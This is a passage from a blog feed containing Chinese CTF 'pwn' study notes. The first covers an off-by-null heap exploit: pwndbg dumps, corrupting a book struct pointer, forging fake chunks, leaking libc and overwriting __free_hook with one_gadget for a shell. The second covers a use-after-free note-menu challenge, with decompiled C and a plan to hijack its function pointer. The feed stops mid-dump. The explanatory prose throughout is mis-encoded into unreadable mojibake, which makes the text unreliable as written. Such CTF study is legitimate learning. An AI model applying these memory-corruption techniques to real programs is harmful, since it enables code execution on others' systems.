class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæˆ‘æƒ³ç€ç›´æ¥é€šè¿‡ IDA åç¼–è¯‘çš„æ¥ç¡®å®šè¿™ä¿© BSS æ®µæ•°æ®çš„åœ°å€çš„ï¼Œç»“æœ IDA é‡Œè«åå…¶å¦™çš„ï¼Œæœ‰ç‚¹æ€ªæ€ªçš„ï¼Œè¿™é‡Œå°±ç›´æ¥ GDB è°ƒç®—åç§»ç„¶åç®—çœŸå®åœ°å€ä¹‹ç±»çš„å§ã€‚é¦–å…ˆï¼Œåˆšåˆšé‚£é‡Œç¡®å®šäº†ä½œè€… name çš„é‚£ä¸ªåœ°å€ä¸ºï¼š0x555555602040ï¼Œgdb é‡Œè°ƒçš„æ—¶å€™æŸ¥åˆ° elf çš„åŸºåœ°å€ä¸ºï¼š0x555555400000ï¼ˆæ‰‹åŠ¨è®¡ç®—å‡ºæ¥çš„ï¼‰ï¼Œç„¶åç®—å‡º bss é‡Œä½œè€… name çš„åç§»ä¸ºï¼š0x202040ï¼ŒåŠ èµ·æ¥ä¹‹åå’Œ 0x555555602040 è¿™ä¸ªåœ°å€ä¸€æ ·ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥æ–­å®šï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯å­˜æ”¾ä½œè€…åå­—çš„åœ°æ–¹ï¼Œä¹‹åï¼Œç»è¿‡ä¸¤æ¬¡ç”³è¯·å†…å­˜ä¹‹åï¼Œå†çœ‹çœ‹ 0x555555602040 åœ°å€çš„å†…å­˜ï¼ˆæ ¹æ®ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„åœ¨ bss æ®µä¸Šï¼Œç„¶åæš´åŠ›ç»è¿‡ä¸¤æ¬¡ malloc ä¹‹åæŸ¥è¯¢ bss æ®µå†…å®¹æœ‰æ— å˜åŒ–å‘ç°äº†ä¸€äº›å°‘é‡å˜åŒ–ï¼Œç”±æ­¤å®šä½ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„çš„åœ°å€ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x00005555556037a0      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å‘ç° 0x555555602060 è¿™ä¸ªåœ°å€çš„å†…å®¹å˜äº†ï¼Œå¹¶ä¸”ï¼Œè¿˜æ˜¯æŸä¸ªä¹¦çš„ç»“æ„ä½“çš„æ•°æ®åŸŸçš„åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x00005555556037a0</span></span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603850: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603860: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603870: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603880: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹åˆšå¥½æ•´ä¸ªç¨‹åºå­˜åœ¨ä¸€ä¸ªä¿®æ”¹ä½œè€…åå­—çš„åŠŸèƒ½ï¼Œå¯ä»¥ä¿®æ”¹ä½œè€…åå­—ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ off by nullï¼Œä¿®æ”¹ 0x00005555556036f0 ä¸º 0x0000555555603600ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602050: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602060: 0x0000555555603700      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œ0x0000555555603600 è¿™ä¸ªåœ°å€æŒ‡å‘çš„åœ°æ–¹æ˜¯å“ªé‡Œå‘¢ï¼Ÿç”¨ heap æŒ‡ä»¤çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603290</span><br><span class="line">Size: 0x410 (with flag bits: 0x411)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036a0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036c0</span><br><span class="line">Size: 0xd0 (with flag bits: 0xd1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603790</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037f0</span><br><span class="line">Size: 0x20810 (with flag bits: 0x20811)</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¿™ä¸ªåœ°å€æ˜¯åœ¨ book1_desc çš„ä¸­é—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x5555556036c0</span></span><br><span class="line">0x5555556036c0: 0x0000000000000000      0x00000000000000d1</span><br><span class="line">0x5555556036d0: 0x65645f316b6f6f62      0x0000000000006373</span><br><span class="line">0x5555556036e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556036f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603700: 0x0000000000000000      0x0000000000000000&lt;-------------------</span><br><span class="line">0x555555603710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603770: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603780: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603790: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å†…å­˜å¸ƒå±€å¤§æ¦‚æœ‰äº†ï¼Œè¿™é‡Œå€Ÿç”¨æŸä½å¤§ä½¬çš„å›¾ï¼ˆhollkï¼‰ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5946f3207d5348e39aa969baf50b0db3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¿®æ”¹äº† book1 çš„ç»“æ„ä½“æŒ‡é’ˆåœ°å€ä¹‹åï¼Œå› ä¸º book1_name è¿™é‡Œæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æŒ‡å‘çš„é‚£ä¸ªåœ°å€ä¼ªé€ ä¸€ä¸ª fake_chunkï¼Œ</p><p>â€‹å› ä¸ºåé¢ç¡®å®å¯¹æˆ‘è€Œè¨€æœ‰ç‚¹é€†å¤©ï¼Œæ‰€ä»¥ä¹‹åå°±ç®€è¿°äº†å§ï¼Œä¹‹åå°±æ˜¯ä¼ªé€  chunk æ³„éœ² libc åœ°å€ï¼Œç„¶åç»§ç»­ä¼ªé€  fakechunk ä¿®æ”¹ <code>__free_hook</code>  ä¸º one_gadgetï¼Œå³å¯æ‹¿åˆ° shellã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnå­¦ä¹ ç¬”è®°11off_by_one&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwnå­¦ä¹ ç¬”è®°11off_by_one&quot;&gt;#&lt;/a&gt; pwn å­¦ä¹ ç¬”è®°ï¼ˆ11ï¼‰â€“off_by_one&lt;/h1&gt;
&lt;p&gt;â€‹		åœ¨å¤„ç† for å¾ªç¯æˆ–è€… </summary>
      
    
    
    
    <category term="Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…»" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwnå­¦ä¹ ç¬”è®°ï¼ˆ10ï¼‰--UAF</title>
    <link href="http://blog.g01den.top/posts/540e5c20.html"/>
    <id>http://blog.g01den.top/posts/540e5c20.html</id>
    <published>2024-11-05T03:47:12.000Z</published>
    <updated>2024-11-05T03:51:20.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°10uaf"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°10uaf">#</a> Pwn å­¦ä¹ ç¬”è®°ï¼ˆ10ï¼‰â€“UAFï¼š</h1><p>â€‹UAF å°±æ˜¯ Use-After-Freeï¼Œå³ä¸€ä¸ªæŒ‡å‘å †å—çš„æŒ‡é’ˆè¢«é‡Šæ”¾åæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œå½¢æˆäº†æ‚¬ç©ºæŒ‡é’ˆï¼Œä½¿å¾—å †å¯ä»¥å†æ¬¡è¢«ä½¿ç”¨ã€‚</p><p>â€‹ç”±äºæˆ‘ç¯å¢ƒä¼¼ä¹è¿è¡Œä¸äº†æŸä¸ªç¨‹åºï¼Œæ‰€ä»¥æ¼”ç¤ºå°±ä¸åšäº†ï¼Œä¸Šä¸ªç®€å•é¢˜æ¥çœ‹çœ‹ã€‚</p><p>â€‹é¢˜ç›®æ˜¯ä¸€ä¸ªæ ‡å‡†çš„èœå•é¢˜ï¼Œæœ‰åˆ›å»º note å’Œè¾“å‡ºåˆ é™¤çš„åŠŸèƒ½ï¼Œåˆ«çš„ä¸çœ‹äº†ï¼Œç›´æ¥çœ‹é‚£ä¸‰ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆåˆ†é…äº†ä¸€ä¸ªå †ç©ºé—´ï¼Œå…·ä½“å¤§å°ä¸ºæ•°ç»„ notelist çš„å•ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä¹‹åå°±æ˜¯è®© noteliist ç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br></pre></td></tr></table></figure><p>â€‹ä¼°è®¡ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¹‹å malloc ç¬¬äºŒä¸ªå †ï¼Œåœ°å€èµ‹ç»™ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹‹åè¯»å– size å¤§å°çš„å­—ç¬¦è¿›å…¥ç¬¬äºŒä¸ªå †å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">*(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br></pre></td></tr></table></figure><p>â€‹åˆ é™¤ noteï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å…ˆååˆ é™¤äº†ä¸¤ä¸ªå †å—ï¼Œä¸€ä¸ªæ˜¯å†™å…¥çš„å †å—ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¬¬äºŒä¸ªç”Ÿæˆçš„å †å—ï¼Œä¹‹åé‡Šæ”¾äº†ç¬¬ä¸€ä¸ªç”Ÿæˆçš„å †å—ï¼Œä¹Ÿå°±æ˜¯å­˜æ”¾ä¸¤ä¸ªæŒ‡é’ˆçš„é‚£ä¸ªå †å—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>â€‹ä½†ä¹‹åæ²¡æœ‰å¯¹æŒ‡é’ˆè¿›è¡Œç½®é›¶ï¼Œå­˜åœ¨ UAF æ¼æ´ï¼Œå› ä¸º show é‡Œå­˜åœ¨ idx å‚æ•°ï¼Œé‡Šæ”¾åå¦‚æœç”³è¯·å¤§å°å·®ä¸å¤šçš„å †å—ã€‚</p><p>â€‹ä¹‹åæ˜¯ print_note å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œè°ƒç”¨äº†é‚£ä¸ªå †å—é‡Œçš„åŠ¨æ€å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹è¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆå³å¯ getshellã€‚</p><p>â€‹ä¸Š gdb è°ƒä¸€ä¸‹ï¼Œå…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹å ctrl+c æ‰§è¡Œ gdb æŒ‡ä»¤çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 